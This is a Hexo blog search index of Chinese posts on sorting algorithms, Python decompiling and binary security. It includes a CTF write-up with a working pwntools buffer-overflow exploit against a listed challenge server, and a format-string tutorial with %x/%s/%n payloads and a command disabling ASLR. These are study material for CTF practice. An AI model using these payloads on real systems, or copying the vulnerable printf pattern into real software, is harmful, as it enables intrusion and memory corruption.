<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>整数溢出（38）</title>
      <link href="/2023/06/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-38-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
      <url>/2023/06/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-38-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h1><p>首先来看看啥是整数溢出</p><p>整数溢出就是说:某一个整数的值大于了它原本定义空间的大小，就会发生溢出，它又重新从0开始计算大小。</p><p>比如1字节，最大是255</p><p>如果定义的是一个有符号数，则表示的值是-127~128</p><p>当定义某一个数超过128的时候，就会溢出，比如129其实就是-127</p><p>这里我们看一个代码更加的形象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> b = <span class="number">65537</span>;</span><br><span class="line"> <span class="keyword">if</span>(a == b)&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Int overflow successfully!\n&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601134908108.png" alt="image-20230601134908108"></p><p>可以看到这里a和b是相等的</p><p>这个是因为无符号数ungigned short int</p><p>范围是0~65535</p><p>当超过65535的时候就会 溢出，比如65536就是0。所以上面的65537==1</p><p>（这里其实再数学上叫同余式）</p><hr><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>现在基本懂了</p><p>来看看攻防世界的int_overflow</p><p>看到这个题目 看名字就知道是关于一个整数溢出的漏洞</p><p>首先用checksec看看</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601135712723.png" alt="image-20230601135712723"></p><p>是一个32位的，没有cancary和PIE的</p><p>这个感觉就比较容易了</p><p>用IDA打开看看</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601135911275.png" alt="image-20230601135911275"></p><p>老样子，首先看看这个字符串【shitf+f12】</p><p>发现由system 和 cat flag</p><p>还有一个Success</p><p>这里大概就是要利用的地方了</p><p>然后运行一下程序，看看main函数，主要的流程</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601140124614.png" alt="image-20230601140124614"></p><p>选择1继续【login函数】</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601140152585.png" alt="image-20230601140152585"></p><p>这里的函数貌似都很安全</p><p>接着看看check_passed函数</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601140747708.png" alt="image-20230601140747708"></p><p>传入的buf 就是这个函数中的 s</p><p>看到有一个下面有一一个strcpy，字符串拷贝函数，这个函数一个不小心就溢出咯</p><p>这个dest的长度和s的长度差太大了吧，哈哈哈，这样肯定溢出了啊</p><p>首先垃圾字符填充这个dest 14h</p><p>然后看到<img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601141348674.png" alt="image-20230601141348674"></p><p>再ret 之前还有一个leave 指令，也就是说还需要把这个leave指令给覆盖掉才能进行ret</p><p>leave指令相当于：</p><p>mov esp,ebp和pop ebp</p><p>3+1 也就是4个字节的大小</p><p>所以我们真正需要填充的垃圾字符是14H+4H=18H[也就是24]</p><p>password需要的长度是3<del>8个字符，也可以是259</del>264个字符</p><p>那么我们想让返回地址到哪里去呢？</p><p>肯定是上面的system 和 cat flag 这里呗。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601141834761.png" alt="image-20230601141834761"></p><p>得知这个flag的地址是0x804868B</p><p>这里password取的是265个字符</p><p>最后的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">i = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">53752</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span> + p32(<span class="number">0x0804868B</span>) + <span class="string">b&quot;a&quot;</span>*<span class="number">235</span></span><br><span class="line"></span><br><span class="line">i.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">i.sendlineafter(<span class="string">&quot;your username:&quot;</span>,<span class="string">&quot;zzz&quot;</span>)</span><br><span class="line">i.sendline(payload)</span><br><span class="line">i.recv</span><br><span class="line">i.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601144048919.png" alt="image-20230601144048919"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>冒泡排序</title>
      <link href="/2023/05/31/%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%A5%E9%97%A8%E7%AF%87-3-%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/"/>
      <url>/2023/05/31/%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%A5%E9%97%A8%E7%AF%87-3-%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="冒泡排序的基本原理"><a href="#冒泡排序的基本原理" class="headerlink" title="冒泡排序的基本原理"></a>冒泡排序的基本原理</h1><p>数组</p><p>第一个和下一个比较，如果比下一个大，则和下一个交换位置。</p><p>然后改数又和再下一个比较，以此类推。</p><p>当第一个数放好位置后，下一个数来重复上面的过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> arr[] = &#123; <span class="number">4</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">1</span>, &#125;;</span><br><span class="line"><span class="comment">//int i = sizeof(arr) / sizeof(arr[0]);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//每当“冒泡”一次的时候，下一次冒泡就会少一次所以就需要用i--</span></span><br><span class="line">    <span class="comment">//为了使得循环不奇怪掉，所以需要让i&gt;0</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i - <span class="number">1</span>; j++) &#123;</span><br><span class="line"><span class="comment">//这里用i-1 是为了不能溢出，跃出界限</span></span><br><span class="line"><span class="keyword">if</span> (arr[j]&gt;arr[j+<span class="number">1</span>]) &#123;</span><br><span class="line"><span class="comment">//交换数组</span></span><br><span class="line"><span class="type">int</span> temp = arr[j];</span><br><span class="line">arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印字符</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(arr)/<span class="keyword">sizeof</span>(arr[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用sizeof()/sizeof(arr[0])来计算数据的个数</p><p>这里可以把交换数组的函数封装成一个函数，方便以后的调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">exchange</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> i, <span class="type">int</span> j)</span></span><br><span class="line"><span class="comment">//a是要交换的数组，i和j是要进行交换的位置</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> temp = a[i];</span><br><span class="line">a[i] = a[j];</span><br><span class="line">a[j] = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以把打印的封装成一个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> a[])</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(arr)/<span class="keyword">sizeof</span>(arr[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void print(int a[], int sz) &#123;</span><br><span class="line">for (int i = 0; i &lt; sz; i++)</span><br><span class="line">printf(&quot;%d&quot;, a[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 十大排序 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python反编译器</title>
      <link href="/2023/05/31/kali%E5%B7%A5%E5%85%B7-%E5%91%BD%E4%BB%A4-%E5%A4%A7%E6%9D%82%E7%83%A9-3-Python-%E5%8F%8D%E7%BC%96%E8%AF%91%E5%99%A8/"/>
      <url>/2023/05/31/kali%E5%B7%A5%E5%85%B7-%E5%91%BD%E4%BB%A4-%E5%A4%A7%E6%9D%82%E7%83%A9-3-Python-%E5%8F%8D%E7%BC%96%E8%AF%91%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>这个是一个python的工具</p><p>我已经在kali里面安装好了</p><p>使用</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531221701643.png" alt="image-20230531221701643"></p><p>需要用-o 来重新取名字</p><hr><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ uncompyle6 *编译的python文件-pyc-or-pyo*</span><br></pre></td></tr></table></figure><p>查看帮助文档</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ uncompyle6 -h</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> kali工具/命令大杂烩 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BugKu-树木的小秘密</title>
      <link href="/2023/05/31/BugKu-%E6%A0%91%E6%9C%A8%E7%9A%84%E5%B0%8F%E7%A7%98%E5%AF%86/"/>
      <url>/2023/05/31/BugKu-%E6%A0%91%E6%9C%A8%E7%9A%84%E5%B0%8F%E7%A7%98%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>这个题：</p><p>当我们用die看这个文件的时候，通过里面的打包方式，要对他进行拆分，一个exe文件可能不是一个exe文件</p><p>die 的时候，要慢慢看下面的内容，而不是看到一个32位或者64位就开始反编译。</p><p>过程：</p><p>用Die打开看看</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531213218487.png" alt="image-20230531213218487"></p><p>第一行就是打包方式：</p><p>起始当你在下这个文件的时候是4Mb 就已经发现了不对劲</p><p>然后通过百度看看这个PyInstaller(-)[-]</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531221749544.png" alt="image-20230531221749544"></p><p>然后就是来提取一下,首先要把 pyinstxtractor.py 和目标文件放在一起。然后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py easy_reverse.exe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531212526152.png" alt="image-20230531212526152"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531212718596.png" alt="image-20230531212718596"></p><p>这样就提取成功了</p><p>这里看123 这个文件就能直接得到一个base64编码的东西解码就是flag</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531212814276.png" alt="image-20230531212814276"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531222215483.png" alt="image-20230531222215483"></p><p>这里看到好多pyc xxx 奇奇怪怪的文件</p><p>通过百度有一个</p><p>uncompyle6 这个工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 -o [目标文件名字] [源文件]</span><br></pre></td></tr></table></figure><p>如下：</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531221701643.png" alt="image-20230531221701643"></p><p>就得到一个a.py的文件</p>]]></content>
      
      
      <categories>
          
          <category> BugKu </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串(37)</title>
      <link href="/2023/05/31/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-37-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2023/05/31/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-37-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<p>首先啥是格式化字符串</p><p>这里借用维基百科中的内容：</p><p><strong>格式化字符串</strong>（英语：<strong>format string</strong>）是一些[程序设计语言]的输入/输出[库]中能将[字符串]参数转换为另一种形式输出的[函数]。例如C、C++等程序设计语言的printf类函数，其中的转换说明（conversion specification）用于把随后对应的0个或多个函数参数转换为<strong>相应的格式</strong>输出；格式化字符串中转换说明以外的其它字符原样输出。[1]</p><p>关闭地址随机化</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531132925084.png" alt="image-20230531132925084"></p><p>可以先查看一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>然后再root用户下：</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space </span><br></pre></td></tr></table></figure><p>这样就关闭的地址空间随机化</p><hr><p> 首先来看看printf中的%</p><p>%[标志][输出最小宽度][.精度][长度]类型</p><p>1.输出最小宽度:用十进制整数来表示输出的最小位数。</p><ul><li>若实际位数多于定义的宽度，则按实际位数输出</li><li>若实际位数少于定义的宽度则补空格或者0</li></ul><p>2.类型</p><ul><li><p>%c：输出字符，配上%n可用于向指定地址写数据。</p><ul><li>这个配上%n就比牛了</li></ul></li><li><p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p></li><li><p>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p></li><li><p>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p></li><li><p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p></li><li><p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</p></li><li><p>%n：是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p></li></ul><p>来看看printf函数的使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,str)    </span><br></pre></td></tr></table></figure><p>错误的用法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(str)</span><br></pre></td></tr></table></figure><p>在第二种的时候，我们就可以对printf进行控制</p><p>看一个正常的程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>;</span><br><span class="line">    <span class="type">char</span> buf[]=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %d %d %d\n&quot;</span>,buf,a,b,c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>;</span><br><span class="line">    <span class="type">char</span> buf[]=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %d %d %d %x\n&quot;</span>,buf,a,b,c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用gcc对它进行编译</p><p>这里我踩了一个坑</p><p>需要用 -g 不然它会有  without debugging 的警告</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -g -o test</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531165133555.png" alt="image-20230531165133555"></p><p>可以看到前面的test 和 123 是正常的输出，</p><p>但是后面那个f7fcf6a0是啥呢？</p><p>我们用gdb来动态调试一下</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531183518826.png" alt="image-20230531183518826"></p><p>首先是设置断点在printf 这里</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531183556205.png" alt="image-20230531183556205"></p><p>然后程序就停止在了这里，接着用n【next】</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531183650988.png" alt="image-20230531183650988"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531183843078.png" alt="image-20230531183843078"></p><p>从format 的 读取方向就可以看到 %x 这个读取了下一个内存单元的地址</p><p>所以，只要能控制这个format 就可以一直读取内存中的数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">     fgets(str,<span class="number">200</span>,<span class="built_in">stdin</span>);</span><br><span class="line">     <span class="built_in">printf</span>(str);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以去直接读取str[]的内容</p><p>输入：AAAA%08x%08x%08x%08x%08x%08x</p><p>gdb 调试一下 </p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531204217493.png" alt="image-20230531204217493"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531204602497.png" alt="image-20230531204602497"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531204643476.png" alt="image-20230531204643476"></p><p>我们可以用%s来获取指针指向的内存数据</p><p>比如说：我们来构造尝试获取0x41414141的数据</p><p>输入：</p><p>x41x41x41x41%08x%08x%08x%08x%08x%s</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531205501193.png" alt="image-20230531205501193"></p><hr><p>用%n格式来写入数据</p><p>它的作用是把前面打印的长度写入某个内存地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> num=<span class="number">66666666</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before: num = %d\n&quot;</span>, num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d%n\n&quot;</span>, num, &amp;num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After: num = %d\n&quot;</span>, num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531210026094.png" alt="image-20230531210026094"></p><p>我们发现可以够着格式化字符串去访问栈内的数据，并且利用%n向内存中写入东西。</p><p>但是%n的作用是返回打印字符串的长度写到内存中，当我们向写入一个地址的时候，应该如何操作呢？</p><hr><p>肯定就是要用自定义打印字符串宽度啦</p><p>比如：我们想把0x8048000 这个地址写入数据，我们就要做的就是把10进制的134512640作为格式符来控制宽度就可以了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> num=<span class="number">66666666</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before: num = %d\n&quot;</span>, num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.100d%n\n&quot;</span>, num, &amp;num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After: num = %d\n&quot;</span>, num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.134512640d%n\n&quot;</span>, num, &amp;num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After: num = %xn&quot;</span>, num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230531210548949.png" alt="image-20230531210548949"></p><p>这就就能把num 的值 改成相应的地址。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>选择排序</title>
      <link href="/2023/05/30/%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%A5%E9%97%A8%E7%AF%87-2-%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/"/>
      <url>/2023/05/30/%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%A5%E9%97%A8%E7%AF%87-2-%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h1><p>最简单最垃圾的排序算法</p><p>在写的时候</p><ul><li>由简单到复杂<ul><li>验证一步走一步</li><li>多打印中间结果</li></ul></li><li>先局部后整体<ul><li>没思路先细分</li></ul></li><li>先粗糙后精细<ul><li>变量更名</li><li> 语句合并</li><li>边界处理</li></ul></li></ul><hr><p>思路：</p><p>经过一次一次的遍历总体找到最小的数放在最前面，已经放好的不在改变。</p><p>首先假设第一个是最小的，然后将这个数和后面的每一个数进行对比，如果找到了更小的数就把该数和假设的数进行交换。</p><p>数组arr 是通过下标进行操作的，所以我们需要有一个int型的变量来存放这个下标</p><p>也就是下面使用到的Min_Pro</p><p>在进行交换的时候，同时需要一个临时的变量来存放之前的数来进行交换，也就是下面使用到的temp变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> arr[] = &#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">5</span>,<span 